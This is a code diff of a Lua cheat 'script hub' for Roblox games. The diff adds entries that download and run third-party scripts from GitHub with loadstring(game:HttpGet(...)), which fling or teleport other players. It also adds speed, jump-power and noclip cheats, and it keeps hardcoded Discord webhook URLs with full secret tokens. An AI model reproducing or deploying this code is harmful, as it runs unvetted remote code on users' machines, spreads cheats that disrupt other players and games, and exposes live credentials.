@@ -10,6 +10,7 @@
   - نظام سحب للواجهة (Draggable)
   - حجم تلقائي مثالي لكل جهاز
   - إصلاح مشاكل تنفيذ السكربتات
+  - سكربتات إضافية: TP All Players و Fling Things and People
 ]]
 
 -- Services
@@ -31,13 +32,11 @@ local playerGui = player:WaitForChild("PlayerGui")
 -- Webhook configuration
 local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1391150966031519774/iXggOTjgDBm5RhygIozJyBvjmDMktVcKDvdf1OnccwhBMQeiObxk4vnp8x6XczX8mSCD"
 local FEEDBACK_WEBHOOK_URL = "https://discord.com/api/webhooks/1390644943109750834/usIWKQH7mVQkZFnd6rJ9GrDCzzpaKOB0PjG0C9Zb53xcmXj5MKXbRcZSRLc-q1YzNZyO"
-local ERROR_WEBHOOK_URL = "https://discord.com/api/webhooks/1391150966031519774/iXggOTjgDBm5RhygIozJyBvjmDMktVcKDvdf1OnccwhBMQeiObxk4vnp8x6XczX8mSCD"
 
 -- Security system
 local BLACKLIST = {
-    ["Haiderfire15"] = "You are banned from using this script",
+    ["."] = "You are banned from using this script",
     ["M7_MF"] = "You are banned from using this script",
-    ["haider123_kill1"] = "You are banned from using this script",
     ["zaman544"] = "You are banned from using this script",
     ["moen1234567891"] = "You are banned from using this script",
     ["Fffgftgggf1"] = "You are banned from using this script",
@@ -74,8 +73,34 @@ local theme = {
 -- HTTP request function for all executors
 local http_request = (syn and syn.request) or (http and http.request) or (http_request) or (request) or (httprequest) or (fluxus and fluxus.request)
 
--- Scripts database with improved loading methods
+-- Scripts database with improved loading methods and game-specific support
 local SCRIPTS_DATABASE = {
+    {
+        name = "Fling Things and People",
+        description = "Fling objects and players around (Works only in specific games)",
+        category = "Fun",
+        code = [[
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/NameHubScript/_/refs/heads/main/f"))()
+        ]],
+        gameIds = { -- يعمل فقط في هذه المابات
+            "142823291", -- Murder Mystery 2
+            "893973440", -- Flee the Facility
+            "891852901", -- Greenville
+            "12957268429", -- Fling Things and People
+            "6961824067"  -- Fling Things and People NEW
+        }
+    },
+    {
+        name = "TP All Players",
+        description = "Teleport all players to your position",
+        category = "Teleport",
+        code = [[
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/ProGamerBoy610/Button-gui/refs/heads/main/Players%20TP%20Gui"))()
+        ]],
+        featuredIn = {
+            ["default"] = true
+        }
+    },
     {
         name = "MM2 & Flee the Facility OP",
         description = "OP Features like aimbot and auto shot for mm2 and more",
@@ -89,9 +114,9 @@ local SCRIPTS_DATABASE = {
             local script = safeHttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua")
             loadstring(script)()
         ]],
-        featuredIn = {
-            ["142823291"] = true, -- Murder Mystery 2
-            ["893973440"] = true   -- Flee the Facility
+        gameIds = {
+            "142823291", -- Murder Mystery 2
+            "893973440"  -- Flee the Facility
         }
     },
     {
@@ -374,9 +399,9 @@ local SCRIPTS_DATABASE = {
                 end
             end
         ]],
-        featuredIn = {
-            ["891852901"] = true, -- Greenville
-            ["893973440"] = true   -- Flee the Facility
+        gameIds = {
+            "891852901", -- Greenville
+            "893973440"  -- Flee the Facility
         }
     },
     {
@@ -402,8 +427,8 @@ local SCRIPTS_DATABASE = {
                 end
             end
         ]],
-        featuredIn = {
-            ["2753915549"] = true -- Blox Fruits
+        gameIds = {
+            "2753915549" -- Blox Fruits
         }
     }
 }
@@ -585,21 +610,36 @@ local function GetFeaturedScripts(currentGameId)
         local isFeatured = false
         
         -- التحقق من وجود النص في قائمة المميزين لهذه اللعبة
-        if script.featuredIn then
-            if script.featuredIn[currentGameId] then
-                isFeatured = true
-            elseif script.featuredIn["default"] then
-                -- التحقق من وجود نصوص مميزة افتراضية إذا لم تكن اللعبة مدعومة
-                local hasSpecificFeature = false
-                for _, s in ipairs(SCRIPTS_DATABASE) do
-                    if s.featuredIn and s.featuredIn[currentGameId] then
-                        hasSpecificFeature = true
-                        break
-                    end
-                end
-                
-                if not hasSpecificFeature then
+        if script.gameIds then
+            for _, id in ipairs(script.gameIds) do
+                if tostring(id) == currentGameId then
                     isFeatured = true
+                    break
+                end
+            end
+        elseif script.featuredIn and script.featuredIn[currentGameId] then
+            isFeatured = true
+        elseif script.featuredIn and script.featuredIn["default"] then
+            -- التحقق من وجود نصوص مميزة افتراضية إذا لم تكن اللعبة مدعومة
+            local hasSpecificFeature = false
+            for _, s in ipairs(SCRIPTS_DATABASE) do
+                if s.gameIds or (s.featuredIn and s.featuredIn[currentGameId]) then
+                    hasSpecificFeature = true
+                    break
+                end
+            end
+            
+            if not hasSpecificFeature then
+                isFeatured = true
+            end
+        end
+        
+        -- التحقق من القائمة الافتراضية
+        if not isFeatured then
+            for _, name in ipairs(defaultFeatured) do
+                if script.name == name then
+                    isFeatured = true
+                    break
                 end
             end
         end
@@ -669,7 +709,7 @@ local function CreateFeedbackUI(parent)
     feedbackScroll.Parent = parent
     
     local feedbackFrame = Instance.new("Frame")
-    feedbackFrame.Size = UDim2.new(1, -20, 0, isMobile and 400 or 350)
+    feedbackFrame.Size = UDim2.new(1, -20, 0, isMobile and 500 or 450) -- زيادة الارتفاع
     feedbackFrame.Position = UDim2.new(0, 10, 0, 0)
     feedbackFrame.BackgroundColor3 = theme.surface
     feedbackFrame.Parent = feedbackScroll
@@ -764,7 +804,7 @@ local function CreateFeedbackUI(parent)
     local sendButton = Instance.new("TextButton")
     sendButton.Text = "SEND"
     sendButton.Size = UDim2.new(0, isMobile and 100 or 120, 0, isMobile and 30 or 35)
-    sendButton.Position = UDim2.new(0.5, isMobile and -50 or -60, 0, isMobile and 320 or 280)
+    sendButton.Position = UDim2.new(0.5, isMobile and -50 or -60, 0, isMobile and 310 or 280)
     sendButton.BackgroundColor3 = theme.primary
     sendButton.TextColor3 = theme.text
     sendButton.Font = Enum.Font.GothamBold
@@ -774,6 +814,113 @@ local function CreateFeedbackUI(parent)
     local btnCorner = Instance.new("UICorner")
     btnCorner.CornerRadius = UDim.new(0, 6)
     btnCorner.Parent = sendButton
+    
+    -- Player Settings Section
+    local settingsLabel = Instance.new("TextLabel")
+    settingsLabel.Text = "Player Settings"
+    settingsLabel.Size = UDim2.new(1, -20, 0, 30)
+    settingsLabel.Position = UDim2.new(0, 10, 0, isMobile and 350 or 320)
+    settingsLabel.BackgroundTransparency = 1
+    settingsLabel.TextColor3 = theme.primary
+    settingsLabel.Font = Enum.Font.GothamBold
+    settingsLabel.TextSize = isMobile and 14 or 16
+    settingsLabel.TextXAlignment = Enum.TextXAlignment.Left
+    settingsLabel.Parent = feedbackFrame
+    
+    -- Speed Setting
+    local speedLabel = Instance.new("TextLabel")
+    speedLabel.Text = "Speed:"
+    speedLabel.Size = UDim2.new(0.3, -5, 0, 25)
+    speedLabel.Position = UDim2.new(0, 10, 0, isMobile and 385 or 355)
+    speedLabel.BackgroundTransparency = 1
+    speedLabel.TextColor3 = theme.text
+    speedLabel.Font = Enum.Font.Gotham
+    speedLabel.TextSize = isMobile and 12 or 14
+    speedLabel.TextXAlignment = Enum.TextXAlignment.Left
+    speedLabel.Parent = feedbackFrame
+    
+    local speedBox = Instance.new("TextBox")
+    speedBox.PlaceholderText = "16"
+    speedBox.Size = UDim2.new(0.7, -15, 0, isMobile and 25 or 30)
+    speedBox.Position = UDim2.new(0.3, 5, 0, isMobile and 385 or 355)
+    speedBox.BackgroundColor3 = theme.background
+    speedBox.TextColor3 = theme.text
+    speedBox.Font = Enum.Font.Gotham
+    speedBox.TextSize = isMobile and 12 or 14
+    speedBox.Text = ""
+    speedBox.Parent = feedbackFrame
+    
+    local speedCorner = Instance.new("UICorner")
+    speedCorner.CornerRadius = UDim.new(0, 6)
+    speedCorner.Parent = speedBox
+    
+    -- Jump Power Setting
+    local jumpLabel = Instance.new("TextLabel")
+    jumpLabel.Text = "Jump Power:"
+    jumpLabel.Size = UDim2.new(0.3, -5, 0, 25)
+    jumpLabel.Position = UDim2.new(0, 10, 0, isMobile and 415 or 390)
+    jumpLabel.BackgroundTransparency = 1
+    jumpLabel.TextColor3 = theme.text
+    jumpLabel.Font = Enum.Font.Gotham
+    jumpLabel.TextSize = isMobile and 12 or 14
+    jumpLabel.TextXAlignment = Enum.TextXAlignment.Left
+    jumpLabel.Parent = feedbackFrame
+    
+    local jumpBox = Instance.new("TextBox")
+    jumpBox.PlaceholderText = "50"
+    jumpBox.Size = UDim2.new(0.7, -15, 0, isMobile and 25 or 30)
+    jumpBox.Position = UDim2.new(0.3, 5, 0, isMobile and 415 or 390)
+    jumpBox.BackgroundColor3 = theme.background
+    jumpBox.TextColor3 = theme.text
+    jumpBox.Font = Enum.Font.Gotham
+    jumpBox.TextSize = isMobile and 12 or 14
+    jumpBox.Text = ""
+    jumpBox.Parent = feedbackFrame
+    
+    local jumpCorner = Instance.new("UICorner")
+    jumpCorner.CornerRadius = UDim.new(0, 6)
+    jumpCorner.Parent = jumpBox
+    
+    -- Noclip Setting
+    local noclipLabel = Instance.new("TextLabel")
+    noclipLabel.Text = "Noclip:"
+    noclipLabel.Size = UDim2.new(0.3, -5, 0, 25)
+    noclipLabel.Position = UDim2.new(0, 10, 0, isMobile and 445 or 425)
+    noclipLabel.BackgroundTransparency = 1
+    noclipLabel.TextColor3 = theme.text
+    noclipLabel.Font = Enum.Font.Gotham
+    noclipLabel.TextSize = isMobile and 12 or 14
+    noclipLabel.TextXAlignment = Enum.TextXAlignment.Left
+    noclipLabel.Parent = feedbackFrame
+    
+    local noclipBtn = Instance.new("TextButton")
+    noclipBtn.Text = "OFF"
+    noclipBtn.Size = UDim2.new(0.7, -15, 0, isMobile and 25 or 30)
+    noclipBtn.Position = UDim2.new(0.3, 5, 0, isMobile and 445 or 425)
+    noclipBtn.BackgroundColor3 = theme.error
+    noclipBtn.TextColor3 = theme.text
+    noclipBtn.Font = Enum.Font.GothamBold
+    noclipBtn.TextSize = isMobile and 12 or 14
+    noclipBtn.Parent = feedbackFrame
+    
+    local noclipCorner = Instance.new("UICorner")
+    noclipCorner.CornerRadius = UDim.new(0, 6)
+    noclipCorner.Parent = noclipBtn
+    
+    -- Apply Settings Button
+    local applyBtn = Instance.new("TextButton")
+    applyBtn.Text = "APPLY SETTINGS"
+    applyBtn.Size = UDim2.new(1, -20, 0, isMobile and 30 or 35)
+    applyBtn.Position = UDim2.new(0, 10, 0, isMobile and 475 or 460)
+    applyBtn.BackgroundColor3 = theme.primary
+    applyBtn.TextColor3 = theme.text
+    applyBtn.Font = Enum.Font.GothamBold
+    applyBtn.TextSize = isMobile and 14 or 16
+    applyBtn.Parent = feedbackFrame
+    
+    local applyCorner = Instance.new("UICorner")
+    applyCorner.CornerRadius = UDim.new(0, 6)
+    applyCorner.Parent = applyBtn
     
     -- Credits
     local credits = Instance.new("TextLabel")
@@ -787,6 +934,56 @@ local function CreateFeedbackUI(parent)
     credits.TextXAlignment = Enum.TextXAlignment.Left
     credits.Parent = feedbackFrame
     
+    -- Player Settings Functions
+    local noclipEnabled = false
+    local noclipConnection = nil
+    
+    local function applySettings()
+        -- Apply speed
+        local speed = tonumber(speedBox.Text)
+        if speed and speed > 0 then
+            player.Character.Humanoid.WalkSpeed = speed
+            CreateNotification("Speed set to "..speed, theme.success, 3)
+        end
+        
+        -- Apply jump power
+        local jump = tonumber(jumpBox.Text)
+        if jump and jump > 0 then
+            player.Character.Humanoid.JumpPower = jump
+            CreateNotification("Jump power set to "..jump, theme.success, 3)
+        end
+    end
+    
+    local function toggleNoclip()
+        noclipEnabled = not noclipEnabled
+        
+        if noclipEnabled then
+            noclipBtn.Text = "ON"
+            noclipBtn.BackgroundColor3 = theme.success
+            CreateNotification("Noclip enabled", theme.success, 3)
+            
+            noclipConnection = RunService.Stepped:Connect(function()
+                if player.Character then
+                    for _, part in pairs(player.Character:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = false
+                        end
+                    end
+                end
+            end)
+        else
+            noclipBtn.Text = "OFF"
+            noclipBtn.BackgroundColor3 = theme.error
+            CreateNotification("Noclip disabled", theme.warning, 3)
+            
+            if noclipConnection then
+                noclipConnection:Disconnect()
+                noclipConnection = nil
+            end
+        end
+    end
+    
+    -- Events
     textBox:GetPropertyChangedSignal("Text"):Connect(function()
         local text = textBox.Text
         if #text > MAX_FEEDBACK_LENGTH then
@@ -833,6 +1030,9 @@ local function CreateFeedbackUI(parent)
             CreateNotification("Failed to send feedback", theme.error, 3)
         end
     end)
+    
+    applyBtn.MouseButton1Click:Connect(applySettings)
+    noclipBtn.MouseButton1Click:Connect(toggleNoclip)
     
     -- ضبط حجم الإطار التلقائي
     feedbackFrame.AutomaticSize = Enum.AutomaticSize.Y
@@ -916,8 +1116,8 @@ local function createGUI()
     headerCorner.CornerRadius = UDim.new(0, 12)
     headerCorner.Parent = header
 
-    -- Logo container with improved visibility
-    local logoSize = isMobile and 50 or 70
+    -- Logo container with improved visibility (20% larger)
+    local logoSize = math.floor((isMobile and 50 or 70) * 1.2) -- زيادة 20%
     local logoContainer = Instance.new("Frame")
     logoContainer.Size = UDim2.new(0, logoSize, 0, logoSize)
     logoContainer.Position = UDim2.new(0.5, -logoSize/2, 0.5, -logoSize/2)
@@ -1188,19 +1388,6 @@ local function createGUI()
                     CreateNotification("Failed: "..errMsg:sub(1, 50), theme.error, 5)
                 end
                 warn("Execution error:", err)
-                
-                -- إرسال تقرير الخطأ
-                SendWebhook(ERROR_WEBHOOK_URL, {
-                    embeds = {{
-                        title = "Script Execution Error",
-                        description = "**Script:** "..scriptData.name.."\n**Error:** "..errMsg,
-                        color = 14423100,
-                        fields = {
-                            {name = "Player", value = player.Name},
-                            {name = "Game", value = game.Name}
-                        }
-                    }}
-                })
             end
         end)
 
